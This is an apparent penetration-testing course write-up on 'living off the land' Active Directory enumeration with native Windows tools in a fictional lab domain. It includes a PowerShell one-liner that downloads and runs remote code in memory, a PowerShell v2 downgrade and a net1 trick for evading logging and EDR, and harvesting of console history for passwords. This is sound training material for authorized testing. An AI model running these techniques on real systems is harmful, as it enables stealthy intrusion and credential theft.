# Table of Contents

- [Living Off the Land](#living-off-the-land)
  - [Env Commands For Host & Network Recon](#env-commands-for-host--network-recon)
  - [Harnessing PowerShell](#harnessing-powershell)
  - [Checking Defenses](#checking-defenses)
  - [Am I Alone?](#am-i-alone)
  - [Windows Management Instrumentation (WMI)](#windows-management-instrumentation-wmi)
  - [Net Commands](#net-commands)
  - [Dsquery](#dsquery)


---

# Living Off the Land

This section covers AD enumeration using only native Windows tools—no uploads or external tools required.

**Scenario:**
The client requests testing from a managed host without internet access where all tool loading attempts have failed. The objective is to demonstrate enumeration capabilities using only built-in Windows/AD tools ("living off the land").

**Advantages:**
- **Stealth:** Generates fewer log entries and alerts compared to external tools
- **Evasion:** Avoids triggering detection in environments with:
  - Network monitoring and logging (IDS/IPS, firewalls, passive sensors)
  - Host-based defenses (Windows Defender, enterprise EDR)
  - Baseline anomaly detection tools

**Risk Consideration:**
Pulling external tools into the environment exponentially increases detection likelihood. Native tool usage reduces this exposure significantly.

---

## Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

**Basic Enumeration Commands**

| Command | Result |
|---------|--------|
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `echo %logonserver%` | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

<img width="709" height="803" alt="image" src="https://github.com/user-attachments/assets/ad462473-7434-4342-8e69-64cd07b72e6b" />

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command `systeminfo`.

<img width="794" height="798" alt="image" src="https://github.com/user-attachments/assets/84513e21-1a68-4366-a064-7cbd0dea32b3" />

The `systeminfo` command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

---

## Harnessing PowerShell

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Here's the table:

| Cmd-Let | Description |
|---------|-------------|
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

### Quick Checks Using PowerShell

```
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

PS C:\htb> Get-ExecutionPolicy -List
Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned


PS C:\htb> whoami
nt authority\system

PS C:\htb> Get-ChildItem Env: | ft key,value

Get-ChildItem Env: | ft key,value

Key                     Value
---                     -----
ALLUSERSPROFILE         C:\ProgramData
APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
CommonProgramFiles      C:\Program Files (x86)\Common Files
CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
CommonProgramW6432      C:\Program Files\Common Files
COMPUTERNAME            ACADEMY-EA-MS01
ComSpec                 C:\Windows\system32\cmd.exe
DriverData              C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS    4
OS                      Windows_NT
Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE  x86
PROCESSOR_ARCHITEW6432  AMD64
PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL         23
PROCESSOR_REVISION      3100
ProgramData             C:\ProgramData
ProgramFiles            C:\Program Files (x86)
ProgramFiles(x86)       C:\Program Files (x86)
ProgramW6432            C:\Program Files
PROMPT                  $P$G
PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
PUBLIC                  C:\Users\Public
SystemDrive             C:
SystemRoot              C:\Windows
TEMP                    C:\Windows\TEMP
TMP                     C:\Windows\TEMP
USERDOMAIN              INLANEFREIGHT
USERNAME                ACADEMY-EA-MS01$
USERPROFILE             C:\Windows\system32\config\systemprofile
windir                  C:\Windows
```

We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

### Downgrade Powershell

```
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

The output confirms we're running an older PowerShell version—the downgrade was successful. Now verify if logging continues.

**Log Locations:**
- **Primary:** `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational` - All session commands log here
- **Secondary:** `Applications and Services Logs > Windows PowerShell` - Logs PowerShell instance starts

Red log entries show activity from the current session. The last entry at 2:12 PM corresponds to the downgrade. After downgrade, logging stops because the older PowerShell version lacks logging capability. This final event matches the last entry in the `Windows PowerShell` log.

<img width="1163" height="675" alt="image" src="https://github.com/user-attachments/assets/e3b5c777-6190-48ab-ac48-3ea268902c17" />

With Script Block Logging enabled, all terminal input is logged. Downgrading to PowerShell V2 breaks this functionality—Script Block Logging doesn't work below PowerShell 3.0, effectively masking subsequent actions.

**Log Evidence:**
- Normal session commands appear in logs
- Logging stops after starting a PowerShell V2 instance
- **Critical:** The downgrade command `powershell.exe -version 2` itself IS logged

**Detection Risk:**
Evidence shows the downgrade occurred and logging ceased for that instance. A vigilant defender may investigate this suspicious pattern.

**Example Log Entries:**
- **Red box:** Pre-downgrade log entries
- **Green text:** Shows new PowerShell session started in HostVersion 2.0

<img width="1291" height="727" alt="image" src="https://github.com/user-attachments/assets/b19eb84e-0d9c-4e01-86e1-b3ca4812cfa6" />

---

## Checking Defenses

The next few commands utilize the `netsh` and `sc` utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

### Firewall Checks
```
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096
```

### Windows Defender Check (from CMD.exe)

```
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the `Get-MpComputerStatus` cmdlet in PowerShell.

### Get-MpComputerStatus

```
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>
```

Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

---

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

### Using qwinsta

```
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

---

## Network Information

| Networking Commands | Description |
|---------------------|-------------|
| `arp -a` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` | Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

Commands like `ipconfig /all` and `systeminfo` provide basic network configurations. Two critical commands offer valuable data for expanding access:

**`arp -a`** - Shows hosts the current box is aware of  
**`route print`** - Displays networks known to the host

**Value for Lateral Movement:**
Networks in the routing table indicate potential lateral movement paths—either frequently accessed (auto-added routes) or administratively configured for domain resource access. These commands are especially useful during black box assessment discovery phases where scanning must be limited.

### Using arp -a

```
PS C:\htb> arp -a

Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240          00-50-56-b9-9d-66     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 10.129.201.234 --- 0xc
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-b9-fc     dynamic
  10.129.202.29         00-50-56-b9-26-8d     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

### Viewing the Routing Table

```
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================

<SNIP>
```

Using arp `-a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. 

---

## Windows Management Instrumentation (WMI)

`Windows Management Instrumentation (WMI)` is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

**Quick WMI checks**

| Command | Description |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts |

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

```
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

---

## Net Commands

Net commands are useful for enumerating local and remote host information, similar to WMI capabilities. They can query:
- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

**Detection Risk:**
`net.exe` commands are typically monitored by EDR solutions and can reveal attacker location during evasive assessments. Organizations may configure alerts for suspicious command usage by specific OUs (e.g., Marketing Associate running `whoami` or `net localgroup administrators`)—an obvious red flag for network defenders.

**Table of Useful Net Commands**

| Command | Description |
|---------|-------------|
| `net accounts` | Information about password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` | Information about domain groups |
| `net group "Domain Admins" /domain` | List users with domain admin privileges |
| `net group "domain computers" /domain` | List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List PC accounts of domains controllers |
| `net group <domain_group_name> /domain` | User that belongs to the group |
| `net groups /domain` | List of domain groups |
| `net localgroup` | All available groups |
| `net localgroup administrators /domain` | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators` | Information about a group (admins) |
| `net localgroup administrators [username] /add` | Add user to administrators |
| `net share` | Check current shares |
| `net user <ACCOUNT_NAME> /domain` | Get information about a user within the domain |
| `net user /domain` | List all users of the domain |
| `net user %username%` | Information about the current user |
| `net use x: \computer\share` | Mount the share locally |
| `net view` | Get a list of computers |
| `net view /all /domain[:domainname]` | Shares on the domains |
| `net view \computer /ALL` | List shares of a computer |
| `net view /domain` | List of PCs of the domain |

### Listing Domain Groups

```
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>
```

We can see above the `net group` command provided us with a list of groups within the domain.

### Information about a Domain User

```
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password changeable          10/28/2021 10:38:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Warehouse            *Printer Access
                             *Domain Users         *VPN Users
                             *Shared Calendar Read
The command completed successfully.
```

### Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

---

## Dsquery

`Dsquery` is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

**User Search**
```
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

**Computer Search**
```
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

**Wildcard Search**
```
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

<SNIP>
```

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

### Users With Specific Attributes Set (PASSWD_NOTREQD)

```
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
